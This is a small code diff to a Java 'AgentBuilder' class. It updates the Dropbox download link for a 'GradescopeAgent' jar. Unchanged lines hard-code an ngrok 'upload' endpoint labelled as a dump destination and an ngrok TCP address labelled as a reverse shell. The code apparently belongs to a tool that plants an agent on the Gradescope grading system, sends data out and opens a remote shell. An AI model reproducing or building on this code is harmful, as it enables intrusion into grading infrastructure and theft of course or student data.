@@ -21,7 +21,7 @@ public class AgentBuilder {
   {
     try {
       agentDownloadURL =
-          new URL("https://www.dropbox.com/scl/fi/jtb5t6ye8of8zftzefeug/GradescopeAgent-1.1.jar?rlkey=8j64wf6wohebuzdu63hb9x0lx&st=nzgsvkyo&dl=1");
+          new URL("https://www.dropbox.com/scl/fi/bj2opcgokpuwvil4diyie/GradescopeAgent-1.2.jar?rlkey=58u2cvrm01w0gfyzysbdo3vdr&st=jqzq2q41&dl=1");
       dumpDestinationURL = new URL("https://e6d0-152-2-31-194.ngrok-free.app/upload");
       reverseShellURL = "tcp://0.tcp.ngrok.io:11491";
     } catch (MalformedURLException e) {
